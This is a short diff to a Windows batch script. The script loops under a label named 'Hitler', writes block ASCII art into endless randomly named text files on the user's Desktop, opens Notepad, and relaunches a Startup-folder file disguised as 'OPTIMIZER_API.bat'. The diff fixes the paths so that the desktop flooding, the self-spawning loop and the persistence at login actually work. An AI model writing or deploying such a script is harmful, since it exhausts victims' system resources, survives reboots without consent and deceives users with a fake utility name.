@@ -12,7 +12,7 @@ echo.
 REM Loops
 
 :Hitler
-	set FILENAME=%RANDOM%.txt
+	set FILENAME="%userprofile%\Desktop\%RANDOM%.txt"
 	echo.
 	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ >> %FILENAME%
 	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> %FILENAME%
@@ -27,5 +27,5 @@ REM Loops
 	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
 	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
   	start "" notepad.exe
-  	start "" C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\OPTIMIZER_API.bat
+  	start "" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\OPTIMIZER_API.bat"
   	goto :Hitler
